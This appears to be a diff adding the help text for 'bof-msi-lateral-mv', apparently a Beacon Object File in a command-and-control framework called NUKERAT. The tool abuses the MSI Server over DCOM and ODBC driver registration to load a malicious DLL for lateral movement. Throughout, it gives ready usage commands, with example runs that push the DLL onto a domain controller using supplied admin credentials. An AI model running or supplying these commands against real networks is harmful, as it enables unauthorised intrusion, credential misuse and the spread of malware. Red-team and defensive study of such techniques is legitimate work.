@@ -1,0 +1,35 @@
+ABOUT
+    Uses the MSI Server over DCOM to install and configure an ODBC driver
+    via the Custom Action Server for lateral movement. All arguments are
+    wide strings.
+USAGE:
+    bof-msi-lateral-mv --- local <drivername> <dllpath>
+    bof-msi-lateral-mv --- local <user> <pass> <drivername> <dllpath>
+    bof-msi-lateral-mv --- local <domain> <user> <pass> <drivername> <dllpath>
+    bof-msi-lateral-mv --- remote <host> <drivername> <dllpath>
+    bof-msi-lateral-mv --- remote <user> <pass> <host> <drivername> <dllpath>
+    bof-msi-lateral-mv --- remote <domain> <user> <pass> <host> <drivername> <dllpath>
+
+ARGUMENTS:
+    mode         local or remote execution mode
+    domain       Domain name (optional, domain user scenarios)
+    user         Username (optional, alternate user scenarios)
+    pass         Password (optional, alternate user scenarios)
+    host         Target hostname (remote mode only)
+    drivername   ODBC driver name to register
+    dllpath      Full path to the malicious DLL on the target system
+
+EXAMPLES:
+    bof-msi-lateral-mv --- local MyDriver C:\Windows\Temp\sqldriver.dll
+    bof-msi-lateral-mv --- remote dc01.corp.local MyDriver C:\Windows\Temp\sqldriver.dll
+    bof-msi-lateral-mv --- remote CORP\admin P@ssw0rd dc01.corp.local MyDriver C:\Windows\Temp\sqldriver.dll
+
+NOTES:
+    The DLL must already exist on the target system at the specified path.
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    bof-msi-lateral-mv -w 60 --- local MyDriver C:\Windows\Temp\sqldriver.dll
